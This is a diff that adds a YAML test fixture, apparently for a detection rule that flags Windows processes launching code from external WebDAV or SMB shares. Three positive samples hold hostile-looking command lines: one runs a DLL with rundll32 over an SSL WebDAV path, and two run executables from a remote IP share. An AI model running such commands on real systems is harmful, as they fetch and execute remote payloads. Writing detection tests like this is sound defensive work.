@@ -1,0 +1,52 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: rundll32.exe, executable: 'C:\Windows\System32\rundll32.exe', command_line: 'rundll32 \\203.0.113.9@SSL\DavWWWRoot\x.dll,Start'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: cmd.exe, executable: 'C:\Windows\System32\cmd.exe', command_line: cmd /c \\203.0.113.9\share\payload.exe}
+- id: pos3
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: x.exe, executable: \\webdav\DavWWWRoot\x.exe, command_line: x.exe}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: cmd.exe, executable: 'C:\Windows\System32\cmd.exe', command_line: cmd /c \\10.0.0.5\share\setup.exe}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: cmd.exe, executable: 'C:\Windows\System32\cmd.exe', command_line: cmd /c \\fileserver\apps\setup.exe}
+- id: neg3
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: cmd.exe, executable: 'C:\Windows\System32\cmd.exe', command_line: cmd /c \\192.168.1.10\x\y.exe}
